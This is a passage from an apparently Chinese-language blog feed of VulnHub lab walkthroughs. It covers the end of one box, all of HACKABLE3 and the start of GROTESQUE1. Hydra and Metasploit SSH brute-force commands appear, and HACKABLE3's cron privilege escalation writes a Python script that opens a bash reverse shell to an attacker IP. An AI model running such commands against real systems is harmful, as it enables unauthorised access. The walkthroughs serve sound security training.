&lt;p&gt;发现有一个 quiet 的文件夹里边有很多文件，而所有的文件中的内容都是 quiet 的内容，需要把这个文件先删除，然后查看此文件夹下的内容是否增加  &lt;code&gt;cat * | uniq&lt;/code&gt;   &lt;code&gt;rm -rf *&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-910.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;watch -n1 ls&lt;/code&gt;  监控文件状态&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-911.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;经过一段时间之后发现 quiet 文件又都复原了，判断出来 write 就是些 quiet 文件的，check 就是用来检查 quiet 文件是否存在的，上传 linpeas 检查是否有更多的敏感信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-912.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了一个 /rootcreds.txt 文件，文件里有 root 的账户和密码， &lt;code&gt;su root&lt;/code&gt;  切换到 root 的账户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-913.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
&lt;h3 id=&#34;定时任务查看&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#定时任务查看&#34;&gt;#&lt;/a&gt; 定时任务查看&lt;/h3&gt;
&lt;p&gt;定时任务中就是在不断的执行这两个脚本&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-914.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;check 的作用就是检查文件夹中的内容是否为空是的话就把 root 的密码写到根目录下，write 的作用是遍历写 quiet&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-915.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/135%20HACKABLE3/</guid>
            <title>VULNHUB 35 HACKABLE3</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/135%20HACKABLE3/</link>
            <category>VULNHUB 31-40</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2FibGUtaWlpLDcyMC8=&#34;&gt;https://www.vulnhub.com/entry/hackable-iii,720/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDEwNzgzNi9hcnRpY2xlL2RldGFpbHMvMTE5NDExNDc1&#34;&gt;https://blog.csdn.net/weixin_44107836/article/details/119411475&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 HACKABLE3：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;识别同一网卡下的 ip 地址，并且过滤出提前已知的 MAC 地址，打印出所 有的机器的 ip 地址并扫描其端口，最后删除多余文件&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l &amp;gt; 1.txt ; cat 1.txt | grep &#39;a0&#39; &amp;gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk &#39;&amp;#123;print$1&amp;#125;&#39; &amp;gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-916.png&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.47 靶机开放端口 80 (22 被过滤)&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNDcv&#34;&gt;http://192.168.31.47/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-917.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看网页源码，提示需要尝试上次日记中使用过的端口碰撞技术来解锁&lt;/p&gt;
&lt;p&gt;ssh 端口，并且告诉老板 approve.jpg，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1oYWNrYWJsZTMtdTc1bjFnd2o4MDBiMjJpOWlhcTM1Y2luMGE1ZzhhLmNvbQ==&#34;&gt;并且有一个公司域名 hackable3.com&lt;/span&gt;，此外还有一个用户名 jubiscleudo。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-918.png&#34;&gt;
&lt;p&gt;修改本地 hosts 文件，将 hackable3.com 解析到靶机 ip，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1oYWNrYWJsZTMtOXExcnE2MGEuY29t&#34;&gt;打开 hackable3.com&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-919.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;目录扫描  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.47&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-920.png&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vbG9naW4ucGhw&#34;&gt;http://hackable3.com/login.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-921.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vMy5qcGc=&#34;&gt;http://hackable3.com/3.jpg&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-922.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这个 url 地址就很奇怪&lt;/p&gt;
&lt;h3 id=&#34;steghide-图片隐写&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#steghide-图片隐写&#34;&gt;#&lt;/a&gt; Steghide 图片隐写&lt;/h3&gt;
&lt;p&gt;此图片下载下来进行解析一番&lt;br&gt;
 &lt;code&gt;wget [http://hackable3.com/3.jpg -q&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;steghide extract -sf 3.jpg&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这里使用了文件隐写，Steghide 是一款开源的隐写术软件，它可以让你在一张图片或者音频文件中隐藏你的秘密信息，而且不会注意到图片或音频文件发生了任何的改变。而且，你的秘密文件已经隐藏在了原始图片或音频文件之中了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-923.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;爆出了一个 65535 的端口，猜测是需要端口敲门的一个端口号&lt;/p&gt;
&lt;h3 id=&#34;有效目录筛选&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#有效目录筛选&#34;&gt;#&lt;/a&gt; 有效目录筛选&lt;/h3&gt;
&lt;p&gt;继续访问其他的 url 地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vMi50eHQ=&#34;&gt;http://hackable3.com/2.txt&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-924.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了 2.txt 这个文件，有 brainfuck 加密的一段密文，用在线网址进行解密&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-925.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现了第二个数字 4444，继续对未搜寻的目标网址进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vY29uZmlnLzEudHh0&#34;&gt;http://hackable3.com/config/1.txt&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-926.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了 1.txt，直接通过终端进行 base64 解密，找到了第三个数字 10000&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-927.png&#34; width=&#34;310&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vY29uZmlnLnBocA==&#34;&gt;http://hackable3.com/config.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-928.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了一些数据库的配置信息，但是没有利用价值&lt;/p&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vYmFja3VwL3dvcmRsaXN0LnR4dA==&#34;&gt;http://hackable3.com/backup/wordlist.txt&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-929.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到一个可能是密码的一个清单&lt;/p&gt;
&lt;p&gt;至此信息收集工作完毕，简单总结一下我们收集到的信息&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20v&#34;&gt;http://hackable3.com/&lt;/span&gt;--&amp;gt; 疑似用户名 jubiscleudo&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vYmFja3VwL3dvcmRsaXN0LnR4dA==&#34;&gt;http://hackable3.com/backup/wordlist.txt&lt;/span&gt; --&amp;gt; 疑似密码清单&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vY29uZmlnLzEudHh0&#34;&gt; http://hackable3.com/config/1.txt&lt;/span&gt; --&amp;gt; 10000&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vY3NzLzIudHh0&#34;&gt;http://hackable3.com/css/2.txt&lt;/span&gt; --&amp;gt; 4444&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vMy5qcGc=&#34;&gt;http://hackable3.com/3.jpg&lt;/span&gt; --&amp;gt; steghide extract -sf 3.jpg --&amp;gt; 65535&lt;/p&gt;
&lt;h3 id=&#34;shell脚本端口敲门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#shell脚本端口敲门&#34;&gt;#&lt;/a&gt; shell 脚本端口敲门&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;knockd 服务：即敲门端口服务，该服务通过动态的添加 iptables 规则来隐藏系统开启的服务，使用自定义的一系列序列号来 “敲门”，使系统开启需要访问的服务端口，才能对外访问，不使用时，再使用自定义序列号来 “关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性，它的默认配置文件是： &lt;code&gt;/etc/knockd.conf&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;再次检查 22 端口确定是被过滤掉的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-930.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试用 nmap 依次去访问信息搜集出来的三个端口进行端口敲门&lt;br&gt;
 &lt;code&gt;sudo nmap -p 4444,10000,65535 -A 192.168.31.223&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-931.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 端口敲门失败了，可能是防火墙规则有一定的限制，比如两个端口之间的敲门间隔，两个端口之间的敲门顺序等&lt;/p&gt;
&lt;p&gt;利用 shell 命令进行批量端口敲门&lt;br&gt;
 &lt;code&gt;for i in 10000,4444,65535;do sudo nmap -p $i 192.168.31.48;done&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-932.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这种方法依次对三个端口进行敲门，不分前后顺序，所以敲门依旧失败了，将逗号去掉，依次对三个端口进行敲门&lt;br&gt;
 &lt;code&gt;for i in 10000 4444 65535;do sudo nmap -p $i 192.168.31.48;done&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-933.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;端口敲门成功后，就可以用字典进行爆破 ssh 协议了&lt;/p&gt;
&lt;h3 id=&#34;hydra或msf-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra或msf-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 或 msf 爆破 ssh&lt;/h3&gt;
&lt;p&gt;用户名就用我们信息收集阶段收集到的敏感用户名 jubiscleudo，密码选取在网站上看到的疑似密码的文件&lt;br&gt;
 &lt;code&gt;wget http://hackable3.com/backup/wordlist.txt -O passwd.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-934.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;使用 hydra 尝试 ssh 的爆破&lt;br&gt;
 &lt;code&gt;hydra -l jubiscleudo -P wordlist.txt ssh://192.168.31.48 -t 4 -f -I -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-935.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-936.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 爆破成功，拿到了 jubiscleudo 用户的密码为 onlymy&lt;/p&gt;
&lt;p&gt;也可以用 msfconsole 进行 ssh 的爆破&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用 msfconsole 的方法设置参数，如使用 ssh_login 的模块，设置攻击 ip，爆破成功后的行为，线程，日志，密码清单，密码用户等；可以通过 options 选项查看该设置哪些参数&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;msfconsole&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use scanner/ssh/ssh_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 192.168.31.48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set STOP_ON_SUCCESS yes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set THREADS 4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set VERBOSE true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set PASS_FILE /home/parallels/Desktop/tool/hackable3/wordlist.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set USERNAME jubiscleudo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-937.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;设置好参数之后通过 run 命令开始执行 payload&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-938.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-939.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 爆破成功之后爆出来了用户名和密码 jubiscleudo:onlymy&lt;/p&gt;
&lt;h3 id=&#34;数据库备份文件泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据库备份文件泄露&#34;&gt;#&lt;/a&gt; 数据库备份文件泄露&lt;/h3&gt;
&lt;p&gt;登陆服务器  &lt;code&gt;ssh 192.168.31.48 -l jubiscleudo&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-940.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对服务器的版本，SUID，pkexec，id 组，sudo，cron 检测后没有发现敏感文件，寻找服务器上是否有敏感的遗留文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-941.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在网站主目录下找到一个备份文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-942.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在此文件中看到了数据库的用户名和密码&lt;/p&gt;
&lt;p&gt;-&amp;gt; (‘DB_USERNAME’, ‘hackable_3’);&lt;br&gt;
-&amp;gt; (‘DB_PASSWORD’, ‘TrOLLED_3’);&lt;/p&gt;
&lt;p&gt;mysql 尝试登录此数据库&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-943.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 mysql 尝试登陆时却登陆失败了，那么这个用户名的意义何在？&lt;br&gt;
查看一下此系统中存在哪些用户，发现就是有一个 hackable_3 的用户，直接切换到 hackable_3 用户成功&lt;/p&gt;
&lt;h3 id=&#34;定时任务提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#定时任务提权&#34;&gt;#&lt;/a&gt; 定时任务提权&lt;/h3&gt;
&lt;p&gt;看到 id 组属于 lxd，可以 lxd 提权，&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-944.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这里我们用其他方式提权，给靶机上下载一个 pspy64 s 的监控，看定时任务&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-945.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;靶机上接受到 pspy64s 后，配置可执行权限开始跑程序&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-946.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;有一个 python 脚本定时被执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-947.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试查看次文件时失败了，直接通过 cat 写反弹 shell 的脚本&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; /scripts/to_hackable_3.py &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;os.system(&amp;quot;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.73/4444 0&amp;gt;&amp;amp;1&amp;#x27; &amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-948.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;监听端口，等待 shell 反弹&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-949.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; py 被执行后，成功拿到 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/136%20GROTESQUE1/</guid>
            <title>VULNHUB 36 GROTESQUE1</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/136%20GROTESQUE1/</link>
            <category>VULNHUB 31-40</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ3JvdGVzcXVlLTEwMSw2NTgv&#34;&gt;https://www.vulnhub.com/entry/grotesque-101,658/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BlcnBldHVhbF9CbHVlL2FydGljbGUvZGV0YWlscy8xMjQ1NDE4OTM=&#34;&gt;https://blog.csdn.net/Perpetual_Blue/article/details/124541893&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 GROTESQUE1：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l &amp;gt; 1.txt ; cat 1.txt | grep &#39;a0&#39; &amp;gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk &#39;&amp;#123;print$1&amp;#125;&#39; &amp;gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-950.png&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.29、靶机开放端口 80&lt;/p&gt;
&lt;p&gt;2 ）再次确认开放端口&lt;/p&gt;
&lt;p&gt;识别到的 80 端口，没有其他的端口，感觉是有问题的，因为这种情况很少能侵入到系统，需要再次进行扫描判断结果是否正确&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-951.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 66,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjk=&#34;&gt;http://192.168.31.29&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-952.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;目录扫描:  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.29&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-953.png&#34;&gt;
&lt;p&gt;-&amp;gt; 80 端口可以放弃了，开始把目标放在 66 端口上&lt;/p&gt;
&lt;h3 id=&#34;智力游戏解谜1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#智力游戏解谜1&#34;&gt;#&lt;/a&gt; 智力游戏解谜 1&lt;/h3&gt;
&lt;p&gt;打开 http://192.168.31.29:66/ 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-954.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到有个地址可以直接下载项目地址，这里我们直接点击下载&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-955.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这么多文件，一眼看去只有几个是 1.18 号的文件，先对这几个文件测试&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-956.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;按日期这一列对这些文件进行排序，输入如下命令  &lt;code&gt;ls -Alh | sort -k 7&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-957.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;接下来就依次看看这几个文件  &lt;code&gt;cat assets/* | sort | uniq&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-958.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;一堆乱码，是没有价值的信息 &lt;code&gt;cat index.md&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-959.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这个文件没有有价值的信息 &lt;code&gt;cat _vvmlist | sort | uniq&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-960.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 在这个文件中找到了一个 wordpress 的站点&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-961.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;wordpress-渗透测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wordpress-渗透测试&#34;&gt;#&lt;/a&gt; wordpress 渗透测试&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjkvbHlyaWNzYmxvZw==&#34;&gt;http://192.168.31.29/lyricsblog&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-962.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;直接用 wpscan 工具对 wordpress 站点进行扫描&lt;br&gt;
 &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.29/lyricsblog/ -e&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-963.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到一个用户名 erdalkomurcu&lt;/p&gt;
